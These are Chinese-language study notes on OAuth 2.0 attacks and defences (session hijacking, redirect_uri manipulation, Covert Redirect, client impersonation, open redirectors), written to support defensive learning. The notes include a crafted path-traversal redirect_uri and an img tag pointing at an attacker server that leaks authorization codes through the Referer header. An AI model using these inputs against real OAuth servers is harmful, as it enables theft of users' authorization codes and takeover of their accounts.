# 9.2 Session hijacking 会话劫持 / 授权码复用攻击
## 攻击场景（共享电脑环境，图书馆/公共机房）
1. 用户A在公共电脑登录网站A（OAuth客户端）
2. 网站A走**授权码模式**跳转授权服务器登录授权
3. 授权服务器返回 code，浏览器跳转回调，**code 保存在浏览器历史记录**
4. 用户A用完退出网站A、退出授权服务器，但**不清理浏览器历史**
5. 攻击者B继续用这台电脑，登录自己账号，正常走授权流程
6. 攻击者**篡改回调地址，插入浏览器历史里用户A旧的 code**

## 攻击后果
攻击者B用自己账号登录，却拿到**用户A的资源权限**，完全劫持账号。

## RFC6749 官方强制防御方案（你第5章代码就是这么写的）
> 客户端**绝对不能重复使用同一个授权码 code**
> 如果授权服务器收到重复 code，**必须拒绝，并且吊销之前签发的所有令牌**

授权服务器实现逻辑：
```js
if (code存在) {
  删除缓存里的code; // 一次性！用完立刻销毁！
  再签发token;
}
```
code变成**一次性凭证**，浏览器历史里的旧code已经失效，攻击直接失效。

## 额外防御：code 绑定 client_id
授权服务器必须校验：
当前请求的client_id **必须和签发code时的client_id完全一致**
防止A客户端的code，被B客户端拿去兑换token。

## 补充：302 vs 307 跳转风险
OAuth标准允许任意跳转码，但307跳转浏览器会保留请求方法/数据，存在泄露用户凭证风险，**授权服务统一用302跳转**最安全。

# 9.3 Redirect URI 操控漏洞（重定向地址篡改漏洞）
## 回顾第7章：客户端要注册精确redirect_uri
但**校验逻辑是授权服务器做的**！
客户端注册再好，授权服务器校验宽松=依然被攻破。

OAuth规范只要求：请求redirect_uri和注册匹配，**没规定怎么匹配**。
授权服务器一共有3种校验策略：

## 三种匹配方式（书本表格原版）
注册地址：`https://example.com/path`
| 匹配策略 | 子路径 | 子域名 | 安全性 |
|---|---|---|---|
| **精确完全匹配 Exact Match** | ❌不允许 | ❌不允许 | ✅唯一安全 |
| 允许子目录匹配 | ✅允许 | ❌不允许 | ❌高危 |
| 允许子域名匹配 | ❌不允许 | ✅允许 | ❌高危 |
| 子域名+子目录都允许 | ✅允许 | ✅允许 | ❌极度危险 |

---

## 高危攻击：子目录匹配 + 路径遍历跳转攻击
授权服务器支持**前缀子目录匹配**
客户端注册：
```
https://theoauthclient.com/oauth/oauthprovider/callback
```

攻击者构造恶意redirect_uri（路径遍历`../../`向上跳转）：
```
https://theoauthclient.com/oauth/oauthprovider/callback/../../usergeneratedcontent/attackerpage.html
```

授权服务器校验：前缀匹配注册地址 → **判定合法放行**！

跳转后地址：
```
.../attackerpage.html?code=受害者授权码
```

攻击者页面嵌入一张图片：
```html
<img src="https://攻击者服务器">
```
浏览器加载图片时，**Referer头带上完整URL+code**，攻击者直接窃取code。

## 子域名匹配攻击同理
注册域名`theoauthclient.com`
攻击者页面`attacker.theoauthclient.com`
授权服务器判定合法，直接跳转泄露code/token。

> 重点：**客户端没问题，是授权服务器校验策略太弱！**

# Covert Redirect 隐秘重定向漏洞（官方高危公告）
2014年安全研究者Wang Jing发现，就是**开放重定向漏洞**：
攻击者篡改授权请求里redirect_uri参数，让授权服务器把code/token跳转到恶意网站。

## RFC6819 官方强制防御要求
授权服务器**必须要求客户端预先注册完整redirect_uri**
并且**必须使用精确字符串完全匹配 Exact Match**
禁止子目录、子域名、通配符、正则匹配。

---

# 本章终极背诵总结（面试+开发必背）
1. 授权码code必须**一次性使用，用完立即删除**，防御浏览器历史劫持攻击
2. code必须绑定client_id，防止跨客户端盗用
3. 授权服务器redirect_uri**必须精确完全匹配**
4. 禁止子目录、子域名、路径遍历、通配符匹配
5. 宽松redirect_uri校验 = OAuth最致命原生漏洞（隐秘重定向Covert Redirect）
6. 授权服务器是整个OAuth安全核心，客户端做得再好，授权服务烂=全崩

# 9.4 Client impersonation（客户端伪装攻击）
## 一句话总结：
**就算攻击者偷到了授权码 code，只要不知道 client_secret，也无法兑换 token —— 前提是授权服务器做对了一步校验！**

## 这一步是什么？
**授权请求时的 redirect_uri 必须和兑换 token 时的 redirect_uri 完全一致！**

## 攻击流程（超级简单版）
1. 攻击者通过 redirect_uri 漏洞**偷到 code**
2. 攻击者把这个 code 丢给**受害者客户端**
3. 受害者客户端拿着自己的 **client_secret** 去授权服务器兑换 token
4. **授权服务器如果不校验前后 redirect_uri 是否一致**，就会直接下发 token
5. 攻击者成功**冒充客户端**，拿到受害者的资源

## 防御代码（书本给的）
```js
if (code.request.redirect_uri) {
  if (code.request.redirect_uri != req.body.redirect_uri) {
    res.status(400).json({ error: 'invalid_grant' });
    return;
  }
}
```

### 作用：
**授权时用的回调地址，必须和换 token 时提交的回调地址一模一样！**
不一致直接拒绝！

# 9.5 Open redirector（开放重定向漏洞）
## 一句话总结：
**授权服务器不应该在参数错误时自动跳回客户端，而应该直接报错 400！**

## 为什么这是漏洞？
OAuth 规范原来写的是：
> 如果参数错误（比如 scope 不对），授权服务器**自动跳回客户端的回调地址**，并带上错误信息。

这就变成了**开放重定向**：
**任何人都可以让授权服务器跳转到任意已注册的回调地址！**

## 攻击者怎么利用？
1. 攻击者注册一个客户端，回调地址填自己的网站 `attacker.com`
2. 构造一个**错误请求**（比如 scope 乱写）
3. 授权服务器**自动跳转到 attacker.com**

这就变成了一个**官方信任的开放跳转**！

## 危害
- 钓鱼
- 窃取 Referer 里的 code
- 窃取 URL 片段里的 token
- 拼接攻击链偷用户数据

## 正确防御（书本给的）
**不要跳转！直接返回 400 错误页面！**

```js
// 错误写法（会跳转）
res.redirect(urlParsed);

// 正确写法（安全）
res.status(400).render('error', { error: 'invalid_scope' });
```

# 本章终极安全口诀（背会就无敌）
1. **授权码 code 只能用一次**
2. **授权时的 redirect_uri 必须和换 token 时完全一致**
3. **授权服务器必须精确匹配 redirect_uri**
4. **参数错误不要跳转，直接返回 400**
5. **永远用 HTTPS + HSTS**
